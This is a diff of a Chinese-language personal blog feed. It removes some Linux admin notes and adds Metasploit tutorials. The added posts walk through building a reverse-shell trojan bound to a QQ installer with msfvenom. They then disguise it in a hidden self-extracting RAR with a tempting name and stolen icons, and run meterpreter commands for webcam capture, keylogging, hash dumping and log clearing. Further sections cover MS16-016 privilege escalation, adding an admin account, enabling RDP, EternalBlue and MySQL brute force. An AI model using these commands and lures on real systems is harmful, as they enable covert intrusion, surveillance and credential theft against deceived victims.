-<li>如果变量的值都不是以上的值，则执行此程序</li>
-<li>;;</li>
-<li>esac（总结束的标志）</li>
-</ol>
-</li>
-<li>for语句
-<ol>
-<li>for [变量] in 值1 值2。。。</li>
-<li>do</li>
-<li>代码</li>
-<li>done</li>
-</ol>
-</li>
-<li>for语句（传统）
-<ol>
-<li>for (( 初始值;循环控制条件;变量变化 ))</li>
-<li>do</li>
-<li>代码</li>
-<li>done</li>
-</ol>
-</li>
-<li>while语句
-<ol>
-<li>while [ 条件判断 ]</li>
-<li>do</li>
-<li>代码</li>
-<li>done</li>
-</ol>
-</li>
-</ol>
-<h1 id="10-read读取控制台输入">10. read读取控制台输入</h1>
-<ol>
-<li>基本语法：
-<ol>
-<li>read 选项 &quot;&quot; 参数</li>
-<li>-p：指定读取时的提示符</li>
-<li>-t X：指定读取时等待的时间（X秒），如果没有在等待的时间输入，就不再等待了。</li>
-<li>变量：指定读取值的变量名</li>
-</ol>
-</li>
-</ol>
-<h1 id="11-自定义函数">11. 自定义函数</h1>
-<ol>
-<li>基本语法：
-<ol>
-<li>[ function ] funname[()]</li>
-<li>{</li>
-<li>
-<pre><code>Action;
-</code></pre>
-</li>
-<li>
-<pre><code>[return int;]
-</code></pre>
-</li>
-<li>}</li>
-<li>调用：funname [值]</li>
-<li>案例：getsum.sh</li>
-</ol>
-</li>
-</ol>
-<pre><code>#!/bin/bash
-#案例：计算两个参数的和（动态的方式获取），getSum
-#定义函数getSum
-function getSum() {
-        sum=$[$n1+$n2]
-        echo &quot;和sum=$sum&quot;
-}
-#输入两个值
-read -p &quot;请输入一个数n1=&quot; n1
-read -t 10 &quot;请输入一个数n2=&quot; n2
-#调用自定义函数
-getSum $n1 $n2
-</code></pre>
-<h1 id="12-系统函数">12. 系统函数</h1>
-<ol>
-<li>basename函数
-<ol>
-<li>basename：返回完整路径最后/的后面部分，常用于获取文件名</li>
-<li>如果输入basename /root/shellcode/hello.sh</li>
-<li>返回hello.sh</li>
-<li>如果输入basename /root/shellcode/hello.sh .sh</li>
-<li>则返回hello</li>
-</ol>
-</li>
-<li>dirname函数
-<ol>
-<li>dirname：返回完整路径最后/的前面部分，常用于返回路径部分</li>
-<li>如果输入dirname /root/shellcode/hello.sh</li>
-<li>则会返回/root/shellcode</li>
-</ol>
-</li>
-</ol>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[# Linux网络配置]]></title>
-        <id>https://kite-007.github.io/linux-wang-luo-pei-zhi/</id>
-        <link href="https://kite-007.github.io/linux-wang-luo-pei-zhi/">
-        </link>
-        <updated>2021-03-09T13:09:11.000Z</updated>
-        <content type="html"><![CDATA[<ol>
-<li>
-<p>第一种方式：（自动获取）</p>
-<ul>
-<li>登陆后通过界面的设置来进行网络IP的自动获取，好处就是会自动避免IP冲突，缺点则是每次获取的IP可能不一样。工作时需要固定的IP做服务器，所以工作环境不能用。</li>
-<li>查看是否为自动获取或者设置：</li>
-<li><img src="https://kite-007.github.io/post-images/1615295824550.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615295835112.png" alt="" loading="lazy"></li>
-</ul>
-</li>
-<li>
-<p>第二种方式：（指定IP）<br>
-直接修改配置文件来指定IP，并可以连接到外网<br>
-编辑：vi /etc/sysconfig/network-scripts/ifcfg-ens33<br>
-要求：将ip地址配置的静态的，比如：ip地址为192.168.200.130<br>
-ifcfg-ens33 文件说明：<br>
-DEVICE=eth0 #接口名（设备，网卡）<br>
-HWADDR=00:0C:2x:6x:0x：XX #MAC地址 通用轩<br>
-TYPE=Ethernet #网络类型（通常是Ethemet） Online<br>
-UUID=926a57ba-92c6-4231-bacb-f27e5e6a9f44#随机id Privac<br>
-#系统启动的时候网络接口是否有效(yes/no)<br>
-ONBOOT=yes<br>
-#IP的配置方法none|static|bootp|dhcpBOOTPROTO=static<br>
-IP地址<br>
-IPADOR-192.168.200.130<br>
-#网关<br>
-GATEWAY=192.168.200.2<br>
-域名解析器<br>
-DNS1=192.168.200.2</p>
-</li>
-<li>
-<p>编辑：vim /etc/sysconfig/network-scripts/ifcfg-ens33 (初始内容)</p>
-</li>
-</ol>
-<pre><code>TYPE=&quot;Ethernet&quot;
-PROXY_METHOD=&quot;none&quot;
-BROWSER_ONLY=&quot;no&quot;
-BOOTPROTO=&quot;dhcp&quot;  //dhcp表示自动分配
-DEFROUTE=&quot;yes&quot;
-IPV4_FAILURE_FATAL=&quot;no&quot;
-IPV6INIT=&quot;yes&quot;
-IPV6_AUTOCONF=&quot;yes&quot;
-IPV6_DEFROUTE=&quot;yes&quot;
-IPV6_FAILURE_FATAL=&quot;no&quot;
-IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;
-NAME=&quot;ens33&quot;
-UUID=&quot;71c5edbc-7820-4bbf-9923-16d337ccc4ee&quot;
-DEVICE=&quot;ens33&quot;
-ONBOOT=&quot;yes&quot; //这里yes表示自动分配
+<pre><code class="language-shell"># 使用MSF生成木马，并与可执行文件进行捆绑
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.137 -f exe -x /home/ubuntu/PCQQ2021.exe -o /home/ubuntu/桌面/QQ.exe
+
+-p：生成木马所使用的payload
+
+windows/meterpreter/reverse_tcp：申明这是一个windows系统下的一个反弹tcp
+
+还可以设置返回的端口，这里就不设置了，默认返回端口是4444
+
+-f： 代表要捆绑的文件类型，这里是一个exe文件
+
+-x：指定你要捆绑的文件的路径及文件名，这里我选择的是/home/ubuntu/里的PCQQ2020.exe
+
+-o：指定生成的木马文件的路径及文件名，这里我把它保存在原路径里，名字就叫QQ.exe
 </code></pre>
 <ol start="2">
-<li>更改后</li>
+<li>在配置攻击模块之前，可以想办法把木马发送到目标及上面去</li>
+<li>配置攻击模块，监听连入木马的目标机</li>
 </ol>
-<pre><code>TYPE=&quot;Ethernet&quot;
-PROXY_METHOD=&quot;none&quot;
-BROWSER_ONLY=&quot;no&quot;
-BOOTPROTO=&quot;static&quot;
-DEFROUTE=&quot;yes&quot;
-IPV4_FAILURE_FATAL=&quot;no&quot;
-IPV6INIT=&quot;yes&quot;
-IPV6_AUTOCONF=&quot;yes&quot;
-IPV6_DEFROUTE=&quot;yes&quot;
-IPV6_FAILURE_FATAL=&quot;no&quot;
-IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;
-NAME=&quot;ens33&quot;
-UUID=&quot;71c5edbc-7820-4bbf-9923-16d337ccc4ee&quot;
-DEVICE=&quot;ens33&quot;
-ONBOOT=&quot;yes&quot;
-#IP地址
-IPADOR=192.168.200.130
-#网关
-GATEWAY=192.168.200.2
-#域名解析器
-DNS1=192.168.200.2
+<pre><code class="language-shell">#使用exploit/multi/handler监听连入的backdoor
+use exploit/multi/handler
+
+#设置对应的payload。
+set payload windows/meterpreter/reverse_tcp
+
+#显示所有的设置如果需要的话，可能还需要将LHOST，LPORT,设置成与payload中相同的地址和端口。
+show options
+
+set lhost 192.168.200.137
+set lport 4444
+run
+</code></pre>
+<ol start="4">
+<li>这里直接将QQ.exe发送到目标机上面去，目标机双击运行之后，就中招了，可以看到我们拿到了meterpreter。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617182926105.png" alt="" loading="lazy"></li>
+</ul>
+<h2 id="2-肉鸡操作meterpreter">2. 肉鸡操作(meterpreter)</h2>
+<p>chcp 65001解决乱码问题</p>
+<pre><code>ipconfig                #查看IP信息
+shell                   #进一步获取权限
+info                    #查看已有模块信息
+getuid                  #查看权限
+getpid                  #获取当前进程的pid
+sysinfo                 #查看目标机系统信息
+ps                      #查看当前活跃进程
+kill &lt;PID值&gt;            #杀死进程
+reboot / shutdown       #重启/关机shell #进入目标机cmd shell 
+webcam_list             #查看摄像头
+webcam_snap             #通过摄像头拍照
+webcam_stream           #通过摄像头开启视频
+execute                 #在目标机中执行文件execute -H -i -f 
+cmd.exe                 #创建新进程cmd.exe，-H不可见，-i交互
+migrate &lt;pid值&gt;         #将Meterpreter会话移植到指定pid值进程中
+clearav                 #清除windows中的应用程序日志、系统日志、安全日志
+enumdesktops            #查看可用的桌面
+getdesktop              #获取当前meterpreter 关联的桌面
+set_desktop             #设置meterpreter关联的桌面 -h查看帮助
+screenshot              #截屏
+use espia               #或者使用espia模块截屏 然后输入screengrab
+run vnc                 #使用vnc远程桌面连接
+</code></pre>
+<p>这里虚拟机没有开启摄像头，所以截取了屏幕。<br>
+<img src="https://kite-007.github.io/post-images/1617183284436.png" alt="" loading="lazy"></p>
+<h3 id="1-利用rar自解压原理运行木马">1. 利用RAR自解压原理运行木马</h3>
+<ul>
+<li>如果对方就是不运行你所发送的捆绑木马文件，就可以利用RAR自解压的功能来达到目的。<br>
+<img src="https://kite-007.github.io/post-images/1617187147948.png" alt="" loading="lazy"><br>
+<img src="https://kite-007.github.io/post-images/1617187840287.png" alt="" loading="lazy"><br>
+这里有两个文件，其中一个就是刚刚所生成的捆绑木马，一个是txt文档，另外又生成了一个木马文件。<br>
+方法：</li>
+</ul>
+<ol>
+<li>全部选中，鼠标右键添加到压缩文件</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617188798912.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="2">
+<li>压缩文件的名字可以是充满诱惑性的，比如对方所想要的那个人的联系方式(只是名字)，注意这里的.exe并不是文件类型，后面会说他的用处。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617188964866.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="3">
+<li>在文件的高级选项中，有自解压选项，打勾确定，解压路径随便指定，最好是不能被对方发现。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617189101373.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="4">
+<li>在这里我想到了多种的组合方式，可以是捆绑后的.exe文件和一个正常的.txt文件，也可以是木马.exe文件和正常的.txt文件，还可以是正常的.exe文件和木马.exe文件，这就是上面所说创建了三个文件的原因。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617189355892.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="5">
+<li>在模式选项卡中设置解压时隐藏所有信息，之后确定完成创建。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617189470051.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617189481034.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="6">
+<li>将此文件想办法发送到目标主机，之后设置监听反弹并run，等待木马运行连接。</li>
+<li>在第四步中，一个txt文件按常理历来说是达不到80多MB的，这样直接就从文件大小直接反映了问题，所以需要伪装一下。</li>
+</ol>
+<h3 id="2-对rar木马文件进行伪装">2. 对RAR木马文件进行伪装</h3>
+<ol>
+<li>这里重新弄了两个文件</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192336284.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="2">
+<li>解压路径还是那样，最好不要被发现</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192360028.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="4">
+<li>这里两个文件的顺序可以颠倒</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192367342.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="6">
+<li>解压到临时文件夹是为了隐蔽，但是实际中是不勾选的，全部隐藏要选。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192380588.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="7">
+<li>在更新中，更改更新模式为解压并更新文件，更改覆盖模式为覆盖所有文件，这步很重要。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192399285.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="8">
+<li>使用BeCyIconGrabber以及Resource Hacker对文件进行伪装。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192415771.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="9">
+<li>目标机状况</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617193540401.png" alt="" loading="lazy"></li>
+</ul>
+<h1 id="2-msf提权">2. MSF提权</h1>
+<p><em>提权的漏洞在./exploit/windows/local目录下</em></p>
+<ol>
+<li>我们使用上述的木马打到了，获得了shell，是user权限，但是权限并不是最高的，但是可以通过一些方式提升到system权限。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617199300467.png" alt="" loading="lazy"></li>
+</ul>
+<ol start="2">
+<li>输入命令。</li>
+</ol>
+<pre><code class="language-shell"># 把当前的metasploit shell转为后台运行。
+background
+
+# 我选择了ms16-016这个漏洞在进行提权
+search ms16-016
+
+# 选择漏洞，查看设置参数
+use exploit/windows/local/ms16_016_webdav
+info | show options
+* 可以看见只有一个SESSION参数要设置，是后门连接的id号，我这里是2。
+
+# 进行提权
+run | exploit
+* 虽然提权成功了 但你getuid下还是看见的是user权限
+
+# 查看进程下面，确认漏洞已经运行的PID进程685
+ps
+
+# 根据进程的提示我们确实是system权限，还要用到migrate 命令来迁移到一个指定的进程ID。
+migrate 685
+
+# getuid查看，提权成功。
+
+# 添加用户并添加为管理员组
+user a a /add
+net localgroup administrators a /add
+
+# 用Nmap扫下并没有开启远程登陆3389
+nmap -a 192.168.200.137
+
+# 开启目标主机3389
+run getgui -e  
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# MSF攻击使用(四)]]></title>
+        <id>https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/</id>
+        <link href="https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/">
+        </link>
+        <updated>2021-03-30T11:10:02.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-exploit%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. exploit简要流程</a></li>
+<li><a href="#2-payload%E9%80%89%E6%8B%A9">2. payload选择</a></li>
+<li><a href="#3-msf-run%E5%8F%82%E6%95%B0">3. MSF run参数</a></li>
+<li><a href="#4-meterpreter">4. meterpreter</a></li>
+<li><a href="#5-auxiliary%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">5. auxiliary简要流程</a>
+<ul>
+<li><a href="#1-syn%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">1. SYN端口扫描</a></li>
+<li><a href="#2-smb%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">2. SMB获取系统信息</a></li>
+<li><a href="#3-%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB">3. 服务识别</a></li>
+<li><a href="#4-%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2">4. 密码嗅探</a></li>
+<li><a href="#5-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">5. 身份验证</a></li>
+</ul>
+</li>
+</ul>
+(MSF)</p>
+<h1 id="1-exploit简要流程">1. exploit简要流程</h1>
+<p><strong>以win 7 与ms17-010实例</strong></p>
+<ol>
+<li>目标主机，需要能够ping通</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617105121301.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="2">
+<li>攻击前，搜索所需要使用的漏洞</li>
+</ol>
+<pre><code class="language-shell">search ms17-010
+</code></pre>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617103946003.png" alt="" loading="lazy"></li>
+<li>辅助模块，可以用于查看是否存在该漏洞。</li>
+</ul>
+<hr>
+<ol start="3">
+<li>攻击流程，选择漏洞</li>
+</ol>
+<pre><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue
+</code></pre>
+<hr>
+<ol start="4">
+<li>查看选项，设置变量</li>
+</ol>
+<pre><code class="language-shell">show options 
+show targets
+
+set RHOST 192.168.200.142
+set target 0
+</code></pre>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617105458664.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="5">
+<li>寻找想要使用的payload</li>
+</ol>
+<pre><code class="language-shell">show payloads
+
+set payload windows/x64/exec
+
+show options
+
+# win下添加用户的命令
+set CMD net user newuser newuser /add
+
+show options
+</code></pre>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617105580722.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="6">
+<li>测试</li>
+</ol>
+<pre><code class="language-shell">run
+</code></pre>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617105617016.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<h1 id="2-payload选择">2. payload选择</h1>
+<p>payload名称命名规则：<br>
+_find_tag：在一个已建立的链接上。<br>
+_reverse_tcp：反向连接到攻击者主机。<br>
+bind_tcp：监听一个tcp连接<br>
+reverse_http：反向链接通过HTTP隧道</p>
+<ul>
+<li>正向与反向：
+<ul>
+<li>主机IP：192.168.200.137</li>
+<li>目标IP：192.168.200.142</li>
+<li>反向：目标IP请求主机IP</li>
+<li>正向：主机IP请求目标IP</li>
+</ul>
+</li>
+</ul>
+<p>--假如目标IP为公网IP（180.12.12.12），则反向连接{公网IP--》主机IP}不能连接。<br>
+--但是正向连接{主机IP--》公网IP}可以连接。</p>
+<p>(三次握手)</p>
+<ol>
+<li>客户端发送SYN包给服务端</li>
+<li>服务端收到之后，回SYN和ACK包返回</li>
+<li>客户端发送ACK回复收到</li>
+</ol>
+<hr>
+<h1 id="3-msf-run参数">3. MSF run参数</h1>
+<ul>
+<li>如果入侵之后要想返回操作去使用其他漏洞进行攻击，使用参数</li>
+</ul>
+<pre><code class="language-shell">-e&lt;opt&gt;要使用的有效载荷编码器。如果没有指定，则使用编码器
+-f 强制开发漏洞，而不考虑极小值的大小。
+-h 帮助
+-j 后台运行。。
+-n &lt;opt&gt;使用NOP发生器。如果没有指定，则使用NOP。
+-o &lt;opt&gt;在VAR=VALL格式中的逗号分隔选项列表。
+-p &lt;opt&gt;使用的有效载荷。如果没有指定，则使用有效载荷。
+-t &lt;opt&gt; 要使用的目标索引或名称。如果没有指定，则使用目标。
+-z 在成功开发后不与会话交互。
+</code></pre>
+<hr>
+<h1 id="4-meterpreter">4. meterpreter</h1>
+<pre><code class="language-shell">session 查看所有肉鸡列表
+session -l 查看在线肉鸡列表(可以进行控制的)
+exploit 执行渗透攻击或模块来攻击目标。
+sessions -i 1打开建立的第一个会话
+·getuid 查看UID
+·sysinfo 查看攻击主机的系统信息
+run hashdump dump 目标主机的hash帐号信息，备份进行暴破PS.查看目标主机进程
+migrate 1576(pid)切换自己为管理员，1576是管理员的进程
+keyscan_start，开启健盘记录功能
+keyscan_dump 查看健盘记录信息
+keyscan_stop.停止健盘记录
+run getgui-e 远程开启目标主机的远程桌面
+run getgui-u cisco -p cisco 远程添加目标主机帐号密码
+rdesktop 192.168.1.100 远程桌面
+</code></pre>
+<h1 id="5-auxiliary简要流程">5. auxiliary简要流程</h1>
+<p><strong>以win 7为例</strong></p>
+<h2 id="1-syn端口扫描">1. SYN端口扫描</h2>
+<p><em>SYN：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</em><br>
+<em>TCP连接的第一个包，非常小的一种数据包。SYN 攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。每个机器的欺骗包都要花几秒钟进行尝试方可放弃提供正常响应。</em></p>
+<pre><code class="language-shell"># 搜索出关于端口扫描的模块
+search portscan 
+
+# 使用SYN扫描模块
+use auxiliary/scanner/portscan/syn 
+
+# 显示需要设置的选项
+info | show options
+
+# 设置网卡信息 注意网卡名称ens33与eth0等等
+set INTERFACE ens33
+
+# 设置扫描端口与目的主机，线程
+set PORTS 1-500
+set RHOSTS 192.168.200.142
+set THREADS 100
+
+run
+* 当提示权限不足时使用sudo命令来启动MSF即可解决
+
+quit | exit | back
+</code></pre>
+<h2 id="2-smb获取系统信息">2. SMB获取系统信息</h2>
+<p><em>SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</em></p>
+<pre><code class="language-shell">search scanner smb
+
+use auxiliary/scanner/smb/smb_version
+
+info
+
+set RHOST 192.168.200.142
+
+run
+</code></pre>
+<h2 id="3-服务识别">3. 服务识别</h2>
+<ol>
+<li>ssh扫描识别</li>
+</ol>
+<pre><code class="language-shell">search auxiliary ssh version
+
+use auxiliary/scanner/ssh/ssh_version
+
+info
+
+set RHOSTS 192.168.200.142
+* 还可以自己指定范围或者多个端口
+set RHOSTS 192.168.200.1-255
+set RHOSTS 192.168.200.142 192.168.200.143
+
+run
+</code></pre>
+<ol start="2">
+<li>ftp扫描识别</li>
+</ol>
+<pre><code>search auxiliary ftp version
+
+use auxiliary/scanner/ftp/ftp_version
+
+info
+
+set RHOSTS 192.168.200.142
+
+run
+</code></pre>
+<h2 id="4-密码嗅探">4. 密码嗅探</h2>
+<p><em>psnuffle</em></p>
+<h2 id="5-身份验证">5. 身份验证</h2>
+<p><em>login</em></p>
+<pre><code>search auxiliary mysql login
+
+use auxiliary/scanner/mysql/mysql_login
+
+info
+
+#找一个测试爆破的用户名字典和密码字典进行爆破
+
+#设置用户字典
+set user_file  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  
+#设置密码字典
+set pass_file   /usr/share/sparta/wordlists/mysql-default-userpass.txt  
+
+run 开始爆破..，知道看到绿色加号即为破解成功！
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# MSF常用命令(三)]]></title>
+        <id>https://kite-007.github.io/msf-chang-yong-ming-ling-san/</id>
+        <link href="https://kite-007.github.io/msf-chang-yong-ming-ling-san/">
+        </link>
+        <updated>2021-03-30T09:20:54.000Z</updated>
+        <content type="html"><![CDATA[<ol>
+<li>在MSF下查看帮助</li>
+</ol>
+<pre><code># 查看帮助文档
+help
+
+# 查看指定命令的帮助说明
+? search
+</code></pre>
+<ol start="2">
+<li>search查看命令<br>
+<img src="https://kite-007.github.io/post-images/1617096460305.png" alt="" loading="lazy"></li>
+</ol>
+<pre><code># 以name参数为例
+search name:ms17-010
+* 这个查询的是名字含有ms17-010的文件
+
+search ms17-010
+* 搜索文件名字或者里面的文件内容
+
+# 查找metasploit框架中所有的渗透攻击和其他模块
+search name
+
+info //
+* 跳转到对应模块查看，展示出指定渗透攻击或模块的相关信息，帮助信息。
+eg:info exploit/windows/smb/ms17_010_eternalblue 
+* 如果已然在一个模块内部，直接使用info就能查看对应模块的信息。
 </code></pre>
 <ol start="3">
-<li>编辑配置操作：<img src="https://kite-007.github.io/post-images/1615298826698.png" alt="" loading="lazy"></li>
-<li>service network restart，reboot</li>
+<li>show列出所有</li>
+</ol>
+<pre><code>show XXX
+
+# 列出metasploit框架中所有的攻击模块
+show exploits
+
+# 列出metasploit框架中所有的攻击载荷
+show payloads
+
+# 列出metasploit框架中所有的辅助攻击模块
+show auxiliary
+
+# 列出渗透攻击所支持的目标平台
+show targets
+</code></pre>
+<ol start="4">
+<li>攻击测试流程(use,set,run)</li>
+</ol>
+<pre><code># 选择一个攻击或者渗透模块
+1. 打开MSF时，MSF的攻击入侵模块有很多，需要选择模块进行使用。
+eg：search ms17-010
+eg：use exploit/windows/smb/smb_doublepulsar_rce
+
+2. 查看MSF，看MSF需要哪些信息（攻击者ip，攻击者端口）才可以攻击目标。
+eg：show options
+* 选择模块show之后，发现有yes的选项参数，这里的yes表示必须要提供的参数，no表示可以不进行提供
+
+LHOST：自己
+RHOST：目标
+
+3. 要给予MSF命令来告诉MSF，要干什么，要攻击哪里，攻击的目标是什么，攻击之后要干什么。
+eg：set RHOST 1.1.1.1
+# 还可以查看已经设置了哪些选项。
+eg：show options 
+
+4. 运行模块，如果提供payloads给MSF攻击之后要干什莫，那麽MSF就会给一个默认的答案
+(主要看攻击脚本的作者有没有添加这个功能)。
+
+5. 可以提供指令给MSF指示入侵之后要拿下目标的权限，CMD或者什么都不做但是要在这之后对目标进行控制。
+eg：show payloads
+# set payload 之后按下tab键可以查看可以设置的payload
+eg：set payload windows/x64/shell/bind_tcp_uuid
+eg：show targets
+eg：set target 1
+# 如果配置错误可以使用unset来清空掉配置
+
+6. 运行，启动攻击
+run | exploit
+</code></pre>
+<ol start="5">
+<li>back跳出</li>
+<li>exit退出</li>
 </ol>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[# Linux添加硬盘]]></title>
-        <id>https://kite-007.github.io/linux-tian-jia-ying-pan/</id>
-        <link href="https://kite-007.github.io/linux-tian-jia-ying-pan/">
+        <title type="html"><![CDATA[# MSF模块笔记(二)]]></title>
+        <id>https://kite-007.github.io/msf-mo-kuai-bi-ji-er/</id>
+        <link href="https://kite-007.github.io/msf-mo-kuai-bi-ji-er/">
         </link>
-        <updated>2021-03-09T03:01:59.000Z</updated>
-        <content type="html"><![CDATA[<ol>
-<li>添加一块硬盘
+        <updated>2021-03-29T13:30:30.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-exploits%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97">1. exploits(漏洞攻击模块)</a></li>
+<li><a href="#2-payloads%E6%BC%8F%E6%B4%9E%E8%B4%9F%E8%BD%BD%E6%A8%A1%E5%9D%97">2. payloads(漏洞负载模块)</a></li>
+<li><a href="#3-auxiliary%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97">3. auxiliary(辅助模块)</a></li>
+<li><a href="#4-encoders%E7%BC%96%E7%A0%81%E5%99%A8%E6%A8%A1%E5%9D%97">4. encoders(编码器模块)</a></li>
+<li><a href="#5-nops%E6%97%A0%E6%93%8D%E4%BD%9C%E7%94%9F%E6%88%90%E5%99%A8%E6%A8%A1%E5%9D%97">5. nops(无操作生成器模块)</a></li>
+<li><a href="#6-post%E5%BC%80%E5%8F%91%E6%A8%A1%E5%9D%97">6. post(开发模块)</a></li>
+<li><a href="#7-evasion">7. evasion</a></li>
+</ul>
+(MSF模块)</p>
+<p><strong>模块目录：/opt/metasploit-framework/embedded/framework/modules</strong><br>
+<img src="https://kite-007.github.io/post-images/1617150488021.png" alt="" loading="lazy"></p>
+<hr>
+<h1 id="1-exploits漏洞攻击模块">1. exploits(漏洞攻击模块)</h1>
+<p><em>漏洞攻击模块列表，入侵式攻击模块</em></p>
+<ul>
+<li>必须要使用payloads模块。exploits模块的NAME命名规则：模块/系统/服务/名称<br>
+<img src="https://kite-007.github.io/post-images/1617094549761.png" alt="" loading="lazy"></li>
+</ul>
 <ol>
-<li>虚拟机添加硬盘
-<ul>
-<li>在VMware的菜单栏中选择（虚拟机）-》（设置）-》（根据提示添加硬盘）-》（完成重启）</li>
-<li><img src="https://kite-007.github.io/post-images/1615259136779.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615259195844.png" alt="" loading="lazy"></li>
-<li>根据推荐一直下一步，选择要添加磁盘的大小后完成，确定。</li>
-<li><img src="https://kite-007.github.io/post-images/1615259311328.png" alt="" loading="lazy"></li>
-<li>重启后可以使用lsblk查看分区 情况</li>
-</ul>
-</li>
-<li>分区
-<ul>
-<li>分区命令：fdisk [/dev/sdb]，</li>
-<li>开始对[/sdb]分区
-<ul>
-<li>m:显示命令列表</li>
-<li>p:显示磁盘分区，同fdisk -l</li>
-<li>n:新增分区</li>
-<li>d:删除分区</li>
-<li>w:写入并退出</li>
-<li>说明：开始分区后输入n来新增分区，然后选择p，分区类型为主分区。两次回车默认剩余全部空间。最后输入w写入分区并退出，若不保存退出输入q。</li>
-<li><img src="https://kite-007.github.io/post-images/1615260284301.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615260290752.png" alt="" loading="lazy"></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>格式化
-<ul>
-<li>lsblk -f查看，上面三个都有UUID，下面新加的没有UUID，则还没有格式化，不可以使用。</li>
-<li>格式化命令：mkfs -t ext4 /dev/sdb1</li>
-<li>ext4为分区类型</li>
-<li><img src="https://kite-007.github.io/post-images/1615260711731.png" alt="" loading="lazy"></li>
-</ul>
-</li>
-<li>挂载
-<ul>
-<li>mount /dev/sdb1 [要挂载的目录]</li>
-<li><img src="https://kite-007.github.io/post-images/1615261173084.png" alt="" loading="lazy"></li>
-<li>用命令行挂挂载，重启后会失效。</li>
-<li>永久挂载
-<ul>
-<li>修改 /etc/fstab，实现自动挂载</li>
-<li>添加完成后，执行mount -a 即刻生效</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>卸载
-<ul>
-<li>umount /dev/sdb1 或者 umount [要卸载的目录]</li>
-</ul>
-</li>
+<li>exploits漏洞模块下，windows漏洞目录/opt/metasploit-framework/embedded/framework/modules/exploits/windows/smb。以ms17_010_psexec.rb为例子，可以vim进入文档之后进行修改，可以以从网上面查找[MSF].rb脚本之后移入文件保存测试。</li>
 </ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617150955806.png" alt="" loading="lazy">
+<ul>
+<li>这里意思是如果发现了某个漏洞，但是没有对应的.rb文件去进行测试的话，就可以去github上面查找对应漏洞的.rb文件（也并不一定非要是.rb文件），之后移入到目录文件对目标进行测试。</li>
+</ul>
 </li>
-</ol>
+</ul>
+<hr>
